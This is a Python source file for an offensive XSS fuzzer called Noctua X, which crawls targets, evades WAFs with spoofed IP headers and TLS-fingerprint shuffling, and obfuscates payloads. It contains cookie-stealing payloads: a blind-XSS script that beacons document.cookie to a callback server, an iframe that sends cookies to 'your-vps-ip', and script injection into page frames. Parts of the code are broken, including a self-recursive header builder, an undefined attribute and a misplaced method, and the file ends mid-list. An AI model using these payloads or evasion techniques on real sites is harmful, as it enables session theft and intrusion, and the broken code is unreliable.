#!/usr/bin/env python3
# =============================================================================
#  Author: Haroon Ahmad Awan · CyberZeus <haroon@cyberzeus.pk>
# =============================================================================

# ─────────────────────────────────────────────────────────────────────────────
#  STANDARD & 3rd-PARTY IMPORTS
# ─────────────────────────────────────────────────────────────────────────────
import os
import sys, asyncio
import re
import ssl
import websocket 
from urllib.parse import urlencode
import sys
import json
import time
import random
import string
import argparse
import warnings
import logging
import asyncio
import base64
import threading
import contextlib
import codecs
import hashlib
import logging
import hashlib
import time
import json
from urllib.parse import urlencode
from typing import Dict, Any, Optional
from playwright.async_api import async_playwright, Error as PlaywrightError
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple, Set
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
import urllib.parse
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

import requests
from requests.adapters import HTTPAdapter
from bs4 import BeautifulSoup, Comment
from fake_useragent import UserAgent

# ── Heavy dependencies for advanced features
try:
    import torch
    from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log
except ImportError:
    torch = None
    AutoTokenizer = AutoModelForMaskedLM = hf_log = None

try:
    import httpx  # chunked & HTTP/2
except ImportError:
    httpx = None

try:
    from wafw00f.main import WafW00F
except ImportError:
    WafW00F = None

# DNSLOG providers
DNSLOG_PROVIDERS = {
    'interact': 'interact.sh',
    'burp': 'burpcollaborator.net',
    'dnslog': 'dnslog.cn',
    'oast': 'oast.pro'
}

# Correct WAFW00F import
try:
    from wafw00f.main import WAFW00F
except ImportError:
    WAFW00F = None

# Async Playwright only
try:
    from playwright.async_api import async_playwright, Error as PlaywrightError
except ImportError:
    async_playwright = None

# Heavy ML deps...
try:
    import torch
    from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log
except ImportError:
    torch = AutoTokenizer = AutoModelForMaskedLM = hf_log = None

try:
    import httpx
except ImportError:
    httpx = None

# SARIF output
try:
    from sarif_om import SarifLog, Tool, Run, Result, Message, Location, PhysicalLocation, ArtifactLocation
except ImportError:
    SarifLog = None

# ─────────────────────────────────────────────────────────────────────────────
#  CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────
VERSION          = "12.0 Enterprise"
MODEL            = "microsoft/codebert-base"
LOGFILE          = Path("Noctua_xss_findings.md")
DEF_THREADS      = 16
MAX_STATIC_PAGES = 300
MAX_NESTED_DEPTH = 5
RATE_LIMIT_SLEEP = 0.05
SESSION_SPLICE_MS= 100
JITTER_MIN_MS    = 20
JITTER_MAX_MS    = 200
VERIFY_TIMEOUT   = 45000
HTTP_TIMEOUT     = 12
HEADLESS_WAIT    = 3500

# Shared HTTP session
SESSION = requests.Session()


# WAF spoof header catalogue
WAF_SPOOF_HEADERS = [
    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
    {"User-Agent": "curl/7.68.0"},
    {"User-Agent": "Wget/1.20.3 (linux-gnu)"},
    {"user-agent": "curl/7.64.1"},
    {"User-AGENT": "Wget/1.20.3 (linux-gnu)"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "192.168.1.100, 127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;proto=https"},
    {"X-Forwarded-Host": "google.com"},
    {"X-Forwarded-Proto": "https"},
    {"Referer": "https://www.google.com/"},
    {"Accept-Language": "en-US,en;q=0.9"},
    {"Accept-Encoding": "gzip, deflate, br"},
    {"Upgrade-Insecure-Requests": "1"},
    {"Cache-Control": "max-age=0"},
    {"Pragma": "no-cache"},
    {"Connection": "keep-alive"},
    {"X-Requested-With": "XMLHttpRequest"},
    {"X-WAP-Profile": "http://google.com/wap.xml"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Via": "1.1 varnish"},
    {"X-UIDH": "123456"},
    {"X-CDN": "Incapsula"},
    {"X-Edge-IP": "127.0.0.1"},
]

def random_headers():
    return {
        **WAFUnblocker().build_headers(),
        "Accept": "text/html,application/xhtml+xml",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document"
    }

# Slack & SARIF (optional at run‑time)
SLACK_WEBHOOK_URL: Optional[str] = None
SARIF_OUTPUT_FILE: Optional[str] = None

# ε‑greedy Q‑learning hyper‑parameters
ALPHA          = 0.30
GAMMA          = 0.80
EPSILON_START  = 0.90
EPSILON_DECAY  = 0.995
EPSILON_MIN    = 0.05

# RL reward scheme
R_BLOCK   = -10.0   # WAF / anti‑bot block (403/429/CAPTCHA)
R_SERROR  = -50.0   # ≥500 server error
R_REFLECT = +10.0   # payload reflected
R_CONFIRM = +100.0  # verified XSS (Playwright or reflection hit)
R_OTHER   = -1.0    # neutral / no signal
R_FAIL    = -20.0   # request threw exception

# Static extensions excluded from crawling
static_exts = {
    "png","jpg","jpeg","gif","bmp","svg","webp","ico",
    "css","woff","woff2","ttf","eot","otf","mp4","mp3","webm",
    "pdf","zip","rar","7z","tar","gz"
}

# CyberZeus-grade SQL error suppression regex covering every major RDBMS & edge case
SQL_ERROR_RE = re.compile(
    r"("  
      # MySQL / MariaDB / InnoDB
      r"SQL syntax|MySQL|MariaDB|InnoDB|unclosed quotation|server version for the right syntax|"  
      # PostgreSQL
      r"PostgreSQL|syntax error at or near|ERROR:\s*syntax error|"  
      # Oracle
      r"ORA-\d{5}|Oracle error|PL/SQL|PL_SQL error|"  
      # SQL Server / T-SQL / ODBC / Jet
      r"SQLServer|T-SQL|Transact-SQL|SQLSTATE\[\d+\]|ODBC|Jet Database Engine|Microsoft OLE DB Provider|"  
      # SQLite
      r"SQLite|SQLITE_ERROR|SQLITE_BUSY|SQLITE_MISUSE|SQLITE_CORRUPT|SQLITE_LOCKED|"  
      # DB2
      r"DB2 SQL|SQLCODE|SQLSTATE|DB2 SQL Error|"  
      # Sybase / Adaptive Server
      r"Sybase|Adaptive Server Enterprise|ASE runtime error|"  
      # Informix
      r"Informix|ON-Error|SQLERRMESSAGE|"  
      # Firebird / InterBase
      r"Firebird|InterBase|Dynamic SQL Error|IB_SQLCODE|"  
      # HSQLDB / H2
      r"HSQLDB|Hypersonic SQL|H2 database error|"  
      # Generic patterns
      r"syntax error near|Unrecognized token|Invalid column name|column does not exist|undefined function|Fatal error in server|"  
      # JDBC / driver messages
      r"JDBC|Data access error|SQLException"  
    r")",
    re.I
)

# ─────────────────────────────────────────────────────────────────────────────
#  NEW: BLIND XSS CALLBACK HANDLER
# ─────────────────────────────────────────────────────────────────────────────
class DomXssAnalyzer:
    def __init__(self, page):
        self.page = page
        self.vulns = []  # ← Fix: initialize vulns list

class BlindXSSCallbackServer:
    """A built-in server to listen for out-of-band XSS callbacks."""
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.server = None
        self.found_callbacks: Dict[str, Dict] = {}

    async def handle_callback(self, reader, writer):
        """Handles incoming HTTP requests to the callback server."""
        data = await reader.read(2048)
        message = data.decode()
        addr = writer.get_extra_info('peername')
        logging.info(f"[BlindXSS] Received callback from {addr!r}")

        try:
            # Extract unique identifier and any captured data (e.g., cookies)
            headers = message.split('\r\n')
            path = headers[0].split(' ')[1]
            unique_id = urlparse(path).path.strip('/')
            
            # Log the full request for analysis
            self.found_callbacks[unique_id] = {
                "source_ip": addr[0],
                "headers": headers,
                "timestamp": time.time()
            }
            logging.critical(f"[BlindXSS] Successful callback for ID: {unique_id}")
            
            response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nACK\r\n"
        except Exception as e:
            logging.error(f"[BlindXSS] Error parsing callback: {e}")
            response = "HTTP/1.1 400 Bad Request\r\n\r\n"

        writer.write(response.encode())
        await writer.drain()
        writer.close()

    async def start(self):
        """Starts the asynchronous callback server."""
        self.server = await asyncio.start_server(
            self.handle_callback, self.host, self.port)
        logging.info(f"[BlindXSS] Callback server listening on {self.host}:{self.port}")
        async with self.server:
            await self.server.serve_forever()

    def get_payload(self, unique_id: str) -> str:
        """ a blind XSS payload pointing to this server."""
        domain = f"http://{self.host}:{self.port}/{unique_id}"
        return f"<script>new Image().src='{domain}?c='+btoa(document.cookie);</script>"

# ─────────────────────────────────────────────────────────────────────────────
#  NEW: ADVANCED CRAWLER & DISCOVERY ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class DiscoveryEngine:
    """Crawls the target, discovers parameters, forms, and JavaScript files."""
    def __init__(self, root_url: str, max_pages: int, crawl_depth: int):
        self.root_url = root_url
        self.root_domain = urlparse(root_url).netloc
        self.max_pages = max_pages
        self.crawl_depth = crawl_depth
        self.crawled_urls: Set[str] = set()
        self.discovered_forms: List[Dict] = []
        self.discovered_params: Dict[str, Set[str]] = defaultdict(set)
        self.js_files: Set[str] = set()
        self.session = requests.Session()

    def crawl(self):
        """Main crawling logic to discover assets."""
        urls_to_crawl = [(self.root_url, 0)]
        
        while urls_to_crawl and len(self.crawled_urls) < self.max_pages:
            url, depth = urls_to_crawl.pop(0)
            if url in self.crawled_urls or depth > self.crawl_depth:
                continue

            try:
                logging.info(f"[Discovery] Crawling: {url}")
                response = self.session.get(url, timeout=10, allow_redirects=True)
                self.crawled_urls.add(url)
                soup = BeautifulSoup(response.text, 'html.parser')

                # 1. Discover Forms
                forms = soup.find_all('form')
                for form in forms:
                    action = urljoin(url, form.get('action'))
                    method = form.get('method', 'GET').upper()
                    inputs = [{'name': i.get('name'), 'type': i.get('type', 'text')} 
                              for i in form.find_all(['input', 'textarea', 'select']) if i.get('name')]
                    if inputs:
                        self.discovered_forms.append({'action': action, 'method': method, 'inputs': inputs})
                        logging.info(f"[Discovery] Found form at {action} with inputs: {[i['name'] for i in inputs]}")

                # 2. Discover URL Parameters (from links)
                links = soup.find_all('a', href=True)
                for link in links:
                    new_url = urljoin(url, link['href'])
                    parsed_url = urlparse(new_url)
                    if parsed_url.netloc == self.root_domain:
                        # Add new URLs to the crawl queue
                        urls_to_crawl.append((new_url.split('?')[0], depth + 1))
                        # Extract parameters
                        params = parse_qs(parsed_url.query)
                        if params:
                            self.discovered_params[new_url.split('?')[0]].update(params.keys())
                
                # 3. Discover JavaScript files
                scripts = soup.find_all('script', src=True)
                for script in scripts:
                    js_url = urljoin(url, script['src'])
                    if urlparse(js_url).netloc == self.root_domain:
                        self.js_files.add(js_url)

            except requests.RequestException as e:
                logging.warning(f"[Discovery] Failed to crawl {url}: {e}")
        
        logging.info(f"[Discovery] Crawl complete. Found {len(self.discovered_forms)} forms, "
                     f"{len(self.discovered_params)} URLs with params, and {len(self.js_files)} JS files.")

# ─────────────────────────────────────────────────────────────────────────────
#  NEW: DOM XSS ANALYSIS ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class DomXssAnalyzer:
    """
    Ultra-aggressive DOM XSS detector:
      • Hooks eval, new Function, setTimeout, setInterval
      • Hooks innerHTML, outerHTML, document.write, setAttribute
      • Hooks element.src, href, location changes
      • Captures full stack, element context & attribute
      • Sends a beacon for each finding
    """
    SNIFF_SOURCES = [
        # URL fragments
        "location.href", "location.origin", "location.protocol",
        "location.host", "location.hostname", "location.port",
        "location.pathname", "location.search", "location.hash",

        # Document properties
        "document.URL", "document.documentURI", "document.baseURI",
        "document.referrer",

        # Window context
        "window.name", "window.opener", "window.parent", "window.top",

        # Storage APIs
        "document.cookie", "localStorage.getItem", "sessionStorage.getItem",
        "indexedDB.open", "history.state",

        # Messaging
        "window.postMessage", "event.data"
    ]

    def __init__(self, page, beacon_url: str = None):
        self.page = page
        self.vulns = []
        self.beacon = beacon_url

    async def analyze(self):
        self.vulns.clear()

        await self.page.set_extra_http_headers({
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Fetch-Site': 'same-origin'
        })

        # Inject XSS detection hooks
        await self.page.context.add_init_script(f"""
            (() => {{
                if (!window.__xss_hits) window.__xss_hits = [];
                const SS = {json.dumps(self.SNIFF_SOURCES)};
                const PAYLOADS = {json.dumps(BASE_PAYLOADS + EXTRA_BASE)};

                function isTainted(v) {{
                    return SS.some(src => v && v.includes(src)) ||
                        PAYLOADS.some(p => v && v.includes(p));
                }}

                function record(sink, payload, elem, attr) {{
                    const payloadType = PAYLOADS.find(p => payload.includes(p)) || 'custom';
                    const stack = new Error().stack.split('\n').slice(2).join('\n');
                    const info = {{
                        page: location.href,
                        sink,
                        payload,
                        payloadType,
                        tag: elem?.tagName,
                        id: elem?.id,
                        cls: elem?.className,
                        attr,
                        stack,
                        timestamp: Date.now()
                    }};
                    window.__xss_hits.push(info);
                    console.error("[XSS]", info);
                    {f"""
                    fetch("{self.beacon}", {{
                        method: "POST",
                        keepalive: true,
                        headers: {{ "Content-Type": "application/json" }},
                        body: JSON.stringify(info)
                    }}).catch(e => console.error('Beacon failed:', e));""" if self.beacon else ""}
                }}

                const hooks = [
                    {{ obj: window, prop: 'eval', name: 'eval' }},
                    {{ obj: window, prop: 'Function', name: 'Function' }},
                    {{ obj: window, prop: 'setTimeout', name: 'setTimeout' }},
                    {{ obj: window, prop: 'setInterval', name: 'setInterval' }},
                    {{ obj: Element.prototype, prop: 'innerHTML', name: 'innerHTML' }},
                    {{ obj: Element.prototype, prop: 'outerHTML', name: 'outerHTML' }},
                    {{ obj: Document.prototype, prop: 'write', name: 'document.write' }},
                    {{ obj: Document.prototype, prop: 'writeln', name: 'document.writeln' }},
                    {{ obj: Element.prototype, prop: 'src', name: 'element.src' }},
                    {{ obj: HTMLAnchorElement.prototype, prop: 'href', name: 'a.href' }},
                    {{ obj: HTMLScriptElement.prototype, prop: 'src', name: 'script.src' }},
                    {{ obj: HTMLIFrameElement.prototype, prop: 'src', name: 'iframe.src' }},
                    {{ obj: Location.prototype, prop: 'href', name: 'location.href' }},
                    {{ obj: Location.prototype, prop: 'assign', name: 'location.assign' }},
                    {{ obj: Location.prototype, prop: 'replace', name: 'location.replace' }}
                ];

                // Escape braces to prevent Python f-string interpolation
                hooks.forEach(({{{{obj, prop, name}}}}) => {{
                    const original = obj[prop];
                    obj[prop] = function(...args) {{
                        const val = args[0];
                        if (isTainted(val)) record(name, val, this, prop);
                        return original.apply(this, args);
                    }};
                }});

                const realSetAttr = Element.prototype.setAttribute;
                Element.prototype.setAttribute = function(name, value) {{
                    if (isTainted(value)) record("setAttribute", value, this, name);
                    return realSetAttr.call(this, name, value);
                }};

                const realAC = Node.prototype.appendChild;
                Node.prototype.appendChild = function(node) {{
                    if (node instanceof Text && isTainted(node.data))
                        record("appendChild(Text)", node.data, this.parentElement, null);
                    return realAC.call(this, node);
                }};

                const wsSendOrig = WebSocket.prototype.send;
                WebSocket.prototype.send = function(data) {{
                    if (typeof data === 'string' && isTainted(data)) {{
                        record("WebSocket.send", data, null);
                    }}
                    return wsSendOrig.apply(this, arguments);
                }};

                // Optional CSP bypass using srcdoc
                try {{
                    const iframe = document.createElement("iframe");
                    iframe.srcdoc = `<script>fetch('http://your-vps-ip:8088/csp?c='+document.cookie)</script>`;
                    document.body.appendChild(iframe);
                }} catch (e) {{}}
            }})();
        """)

        # Reload and trigger hooks
        canary = "XSS_CANARY_" + randstr(6)
        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                for wait_until in ["networkidle", "load", "domcontentloaded"]:
                    try:
                        await self.page.goto(self.page.url + "#" + canary, timeout=VERIFY_TIMEOUT, wait_until=wait_until)
                        break
                    except PlaywrightError:
                        if attempt == max_attempts - 1:
                            logging.warning(f"Failed to load page after {max_attempts} attempts")
                            return

                # Trigger history navigation
                await self.page.evaluate("""() => {
                    history.pushState({}, '', '/xss#trigger');
                    dispatchEvent(new Event('popstate'));
                }""")
                await self.page.wait_for_timeout(1000)

                # Inject into iframes
                for frame in self.page.frames:
                    try:
                        await frame.wait_for_load_state()
                        await frame.evaluate("""() => {
                            const s = document.createElement("script");
                            s.src = "http://your-vps-ip:8088/xss.js";
                            document.body.appendChild(s);
                        }""")
                    except Exception as e:
                        logging.warning(f"[iframe inject failed] {e}")

                try:
                    await self.page.click("a[href]")
                    await self.page.wait_for_navigation(timeout=3000)
                except:
                    pass

                await self.page.wait_for_timeout(1500)

                # Extract hits
                hits = await self.page.evaluate("""() => {
                    return Array.isArray(window.__xss_hits) ? window.__xss_hits : [];
                }""")

                seen = set()
                for h in hits:
                    key = f"{h['page']}-{h['sink']}-{h['payload']}-{h['stack']}"
                    if key not in seen:
                        seen.add(key)
                        logging.critical(f"[DOM-XSS] {h['page']} → {h['sink']} <{h['tag']} id={h['id']} cls={h['cls']}> (Type: {h.get('payloadType', 'custom')})")
                        self.vulns.append(h)
                break

            except Exception as e:
                logging.error(f"[XSS Analysis Error] Attempt {attempt + 1} failed: {e}")
                if attempt == max_attempts - 1:
                    logging.error("Giving up after multiple failures")






    def _get_source_check(self, var_name: str) -> str:
        """Helper to return JS code that checks if a variable contains tainted data."""
        checks = []
        for src in self.SOURCES:
            # wrap src in quotes so JS sees it as a string literal
            escaped = json.dumps(src)  
            checks.append(f"{var_name}.includes({escaped})")
        return " || ".join(checks)

# ─────────────────────────────────────────────────────────────────────────────
#  SUPERCHARGED: REINFORCEMENT LEARNING AGENT
# ─────────────────────────────────────────────────────────────────────────────
class AdvancedRLAgent:
    """An improved RL agent with a more detailed state and reward system."""
    
    def __init__(self, waf: str, server: str,
                 qfile: Optional[Path], enabled: bool = False):
        self.enabled = enabled
        self.waf    = (waf or "none").lower()
        self.server = (server or "unknown").split("/")[0].lower()
        self.qfile  = qfile
        self.epsilon = EPSILON_START
        self.q: Dict[Tuple[str,str,str,str], Dict[str,float]] = defaultdict(dict)
        if qfile and qfile.exists():
            try:
                self.q.update(json.loads(qfile.read_text()))
                logging.info(f"[RL] restored Q‑table with {len(self.q)} states")
            except Exception as e:
                logging.error(f"[RL] could not load Q‑table: {e}")

    # Override the state definition to be more granular
    def _state(self, param: str, context: str) -> Tuple[str, str, str, str]:
        """State now includes WAF, server, parameter type, and reflection context."""
        # Context can be 'HTML_TAG', 'HTML_ATTR', 'JS_VAR', 'NONE'
        return (self.waf, self.server, self._ptype(param), context)

    @staticmethod
    def _ptype(param: str) -> str:
        p=param.lower()
        if p in ("src","href","url","uri","data","link"): return "url_like"
        if p.startswith("on"):                             return "event"
        return "generic"

    # Override the reward function for more nuanced feedback
    def reward(self, param: str, context: str, action: str, r: float, next_param: Optional[str] = None):
        if not self.enabled: return
        s = self._state(param, context)
        sp = self._state(next_param or param, context) # Assume context persists for simplicity
        
        # Add bonus rewards for more critical findings
        if r == R_CONFIRM:
            r += 50 # Extra reward for confirmed XSS

        old = self.q.get(str(s), {}).get(action, 0.0)
        future = max(self.q.get(str(sp), {}).values()) if self.q.get(str(sp)) else 0.0
        
        if str(s) not in self.q:
            self.q[str(s)] = {}
        self.q[str(s)][action] = old + ALPHA * (r + GAMMA * future - old)

    def choose(self, param: str, context: str = 'NONE') -> str:
        if not self.enabled:
            return pick_payload(param)
        state = self._state(param, context)
        self.epsilon = max(EPSILON_MIN, self.epsilon * EPSILON_DECAY)
        if random.random() > self.epsilon and self.q.get(str(state)):
            best = max(self.q[str(state)], key=self.q[str(state)].get)
            dbg(f"[RL] exploit {state} → {best[:30]}")
            return best
        dbg(f"[RL] explore {state}")
        return pick_payload(param)

    def save(self):
        if self.enabled and self.qfile:
            try:
                self.qfile.write_text(json.dumps(self.q))
                logging.info(f"[RL] Q‑table saved → {self.qfile}")
            except Exception as e:
                logging.error(f"[RL] could not save Q‑table: {e}")

# ─────────────────────────────────────────────────────────────────────────────
#  NEW: REPORTING ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class ReportingEngine:
    """Handles outputting findings to various formats."""
    def __init__(self, output_file: str, output_format: str):
        self.output_file = output_file
        self.output_format = output_format.lower()
        self.findings = []

    def add_finding(self, url: str, param: str, payload: str, vuln_type: str, evidence: str):
        self.findings.append({
            "url": url, "param": param, "payload": payload,
            "vuln_type": vuln_type, "evidence": evidence
        })

    def write(self):
        if not self.findings:
            return
            
        if self.output_format == 'json':
            with open(self.output_file, 'w') as f:
                json.dump(self.findings, f, indent=4)
        elif self.output_format == 'sarif' and SarifLog:
            self._write_sarif()
        else: # Default to Markdown
            self._write_markdown()
        
        logging.info(f"Report written to {self.output_file}")

    def _write_markdown(self):
        with open(self.output_file, 'w') as f:
            f.write("# Noctua X - XSS Scan Report\n\n")
            for finding in self.findings:
                f.write(f"## {finding['vuln_type']} XSS Found\n\n")
                f.write(f"- **URL:** `{finding['url']}`\n")
                f.write(f"- **Parameter:** `{finding['param']}`\n")
                f.write(f"- **Payload:** ```{finding['payload']}```\n")
                f.write(f"- **Evidence:** ```{finding['evidence']}```\n\n---\n\n")
                
def _write_sarif(self):
    tool = Tool.from_dict({"driver": {"name": "Noctua X"}})
    results = []

    for finding in self.findings:
        result = Result(
            message=Message(text=f"{finding['vuln_type']} XSS detected in parameter '{finding['param']}'"),
            level="error",
            locations=[
                Location(
                    physical_location=PhysicalLocation(
                        artifact_location=ArtifactLocation(uri=finding['url']),
                        region=None
                    )
                )
            ]
        )
        results.append(result)

    run = Run(tool=tool, results=results)
    log = SarifLog(runs=[run], version="2.1.0")

    with open(self.output_file, 'w') as f:
        json.dump(log.to_dict(), f, indent=4)


# ─────────────────────────────────────────────────────────────────────────────
#  ARGPARSE CONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────
ap = argparse.ArgumentParser(
      description=f"Noctua X · v{VERSION} ")
mx = ap.add_mutually_exclusive_group()
mx.add_argument("--reflected", action="store_true", help="Fuzz reflected XSS only")
mx.add_argument("--stored",    action="store_true", help="Fuzz stored XSS only")
mx.add_argument("--blind",     action="store_true", help="Fuzz blind XSS only")
mx.add_argument("--invent",    action="store_true", help="Enable AI‑invented payloads (MASK token)")

# Target specification
ap.add_argument("-u", "--url", help="Target URL")
ap.add_argument("--crawl", action="store_true", help="Enable crawling")
ap.add_argument("--deep-dom", action="store_true", help="Enable DOM XSS scanning")
ap.add_argument("--autotest",  action="store_true", help="Demonstrate on built‑in vulnerable labs")
ap.add_argument("--login-url", help="Optional login endpoint")
ap.add_argument("--username",  help="Username for login")
ap.add_argument("--password",  help="Password for login")
ap.add_argument("--csrf-field", default="csrf", help="CSRF field name")

# Payload options
ap.add_argument("--payloads-file", help="Custom payloads file")
ap.add_argument("--skip-default", action="store_true", help="Skip built-in payloads")

# Blind XSS
ap.add_argument("--blind-xss", action="store_true", help="Enable blind XSS testing")
ap.add_argument("--dnslog", choices=list(DNSLOG_PROVIDERS.keys()), 
               default="interact", help="DNSLOG provider")
ap.add_argument("--collaborator", help="Custom Burp Collaborator domain")

# Performance
ap.add_argument("--threads",  type=int, default=DEF_THREADS, help="Fuzzing threads")
ap.add_argument("--max-pages",   type=int, default=MAX_STATIC_PAGES, help="Max static pages to crawl")
ap.add_argument("--nested-depth", type=int, default=MAX_NESTED_DEPTH, help="Max iframe depth")
ap.add_argument("--simulate-spa", action="store_true", help="Click links/buttons via Playwright")
ap.add_argument("--crawl-iframes", action="store_true", help="Recurse into iframes")
ap.add_argument("--detect-waf", action="store_true", help="Detect WAF presence")
ap.add_argument("--polymorph", action="store_true", help="Apply random obfuscation transforms")
ap.add_argument("--headed", action="store_true", help="Headed Playwright (visual debug)")
ap.add_argument("--multi-session", action="store_true", help="Two‑pass stored XSS check")

# Output formats
ap.add_argument("--json", help="JSON output file")
ap.add_argument("--txt", help="Text output file")
ap.add_argument("--sarif", help="SARIF output file")
ap.add_argument("--slack-webhook", help="Slack findings webhook URL")

# RL‑specific
ap.add_argument("--self-reinforcement", action="store_true",
                help="Enable ε‑greedy Q‑learning engine")
ap.add_argument("--qtable-file", help="Path to store/restore Q‑table JSON")
ap.add_argument("--debug", action="store_true", help="Verbose debug logging")

args = ap.parse_args()
DEBUG = args.debug

# ─────────────────────────────────────────────────────────────────────────────
#  LOGGING SETUP
# ─────────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s")
warnings.filterwarnings("ignore")
if hf_log:
    hf_log.set_verbosity_error()
os.environ["TRANSFORMERS_NO_TQDM"] = "1"
ssl._create_default_https_context = ssl._create_unverified_context

if args.slack_webhook:
    SLACK_WEBHOOK_URL = args.slack_webhook
if args.sarif:
    SARIF_OUTPUT_FILE = args.sarif

def dbg(msg: str) -> None:
    if DEBUG:
        logging.debug(msg)

# ─────────────────────────────────────────────────────────────────────────────
#  UTILITY FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────
def randstr(n: int = 12) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def jitter(a: int = JITTER_MIN_MS, b: int = JITTER_MAX_MS) -> None:
    time.sleep(random.uniform(a/1000.0, b/1000.0))

def session_splice() -> None:
    time.sleep(SESSION_SPLICE_MS / 1000.0)

def rate_limit() -> None:
    time.sleep(RATE_LIMIT_SLEEP)

def smart_url(u: str) -> str:
    """Prepend scheme if missing and return first live variant."""
    if u.startswith(("http://","https://","ftp://","file://")):
        return u
    for scheme in ("https://","http://"):
        try:
            if requests.head(scheme+u, timeout=3, verify=False).status_code < 500:
                return scheme+u
        except Exception:
            pass
    return "http://" + u

def random_headers() -> Dict[str,str]:
    ua = UserAgent()
    hdrs = {"User-Agent": ua.random}
    if args.detect_waf:
        hdrs.update(random.choice(WAF_SPOOF_HEADERS))
    return hdrs

# ─────────────────────────────────────────────────────────────────────────────
#  AI MODEL FOR "MASK" TOKENS
# ─────────────────────────────────────────────────────────────────────────────
if torch and AutoTokenizer and AutoModelForMaskedLM:
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    tok    = AutoTokenizer.from_pretrained(MODEL)
    mdl    = AutoModelForMaskedLM.from_pretrained(MODEL).to(device).eval()
    MASK_T, MASK_ID = tok.mask_token, tok.mask_token_id
    TOP_K = 7
    def ai_mutate(template: str) -> str:
        s = template
        while "MASK" in s:
            replaced = s.replace("MASK", MASK_T, 1)
            ids = tok(replaced, return_tensors="pt").input_ids.to(device)
            with torch.no_grad():
                logits = mdl(ids).logits
            pos = (ids == MASK_ID).nonzero(as_tuple=True)
            if not pos[0].numel():
                break
            mask_idx = pos[1][0]
            topk = logits[0,mask_idx].topk(TOP_K).indices.tolist()
            s = s.replace("MASK", tok.decode(random.choice(topk)).strip() or "alert(1)", 1)
        return s
else:
    def ai_mutate(template: str) -> str:
        return template.replace("MASK", "alert(1)")

# quick waf unblocker
# ─────────────────────────────────────────────────────────────────────────────
#  WAF / CDN UNBLOCKER  –  JA3-scrambler + header-sprayer
# ─────────────────────────────────────────────────────────────────────────────
class WAFUnblocker:
    """
    • Randomises JA3 / TLS-fingerprint by shuffling ciphers + ALPN
    • Sprays rotating spoof-headers & X-Forwarded-chains
    • Provides per-request 'extra_headers' and 'extra_args' for requests / Playwright
    """
    _ALPNS = [["h2", "http/1.1"], ["http/1.1"], ["h2"], ["spdy/3.1", "http/1.1"]]
    _CIPHERS = [
        "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384",
        "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
        "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
    ]
    _IP_CHAIN = lambda: ",".join(f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(random.randint(2,5)))

    def build_headers(self) -> Dict[str,str]:
        hdr = WAFUnblocker().build_headers()  # original helper
        # add layered X-Forwarded-For chains & misc CDN headers
        hdr.update({
            "X-Forwarded-For": self._IP_CHAIN(),
            "Forwarded": f'for={self._IP_CHAIN()};proto=https',
            "True-Client-IP": "127.0.0.1",
            "CF-Connecting-IP": "127.0.0.1",
            "X-Amzn-Trace-Id": f"Root=1-{randstr(8)}-{randstr(24)}"
        })
        return hdr

    def playwright_args(self) -> List[str]:
        # vary TLS cipher-suite order & ALPN via Chromium flags
        c = random.choice(self._CIPHERS)
        a = random.choice(self._ALPNS)
        return [
            f"--tls13-ciphers={c}",
            f"--ssl-version-max=tls1.3",
            f'--alpn-protos={",".join(a)}'
        ]


# ─────────────────────────────────────────────────────────────────────────────
#  POLYMORPHIC OBFUSCATION
# ─────────────────────────────────────────────────────────────────────────────
def encode_to_utf32_le(s: str) -> str:
    try:
        return s.encode('utf-32-le','ignore').decode('latin-1','ignore')
    except Exception:
        return s

def triple_rot13(s: str) -> str:
    return codecs.encode(codecs.encode(codecs.encode(s,'rot_13'),'rot_13'),'rot_13')

def insert_weird_char(s: str) -> str:
    return "‼".join(s)

obf_base = [
    lambda p: p,
    lambda p: "".join(f"\\x{ord(c):02x}" for c in p),
    lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
    lambda p: base64.b64encode(p.encode()).decode(errors='ignore'),
    lambda p: p.encode('utf-16','ignore').decode('latin-1','ignore'),
    lambda p: codecs.encode(p,'rot_13'),
    lambda p: urllib.parse.quote(p),
    lambda p: p.replace('<','&lt;').replace('>','&gt;'),
    lambda p: p.replace('"','&quot;').replace("'",'&#39;'),
    lambda p: "".join(f"\\{c}" for c in p),
    lambda p: "".join(f"%{ord(c):02X}" for c in p),
    lambda p: "".join(f"&#x{ord(c):X};" for c in p),
    lambda p: "".join(f"&#{ord(c)};" for c in p),
    lambda p: "".join(f"{c}/**/" for c in p),
    lambda p: p[::-1],
    lambda p: p.upper(),
    lambda p: p.lower(),
    lambda p: p.swapcase(),
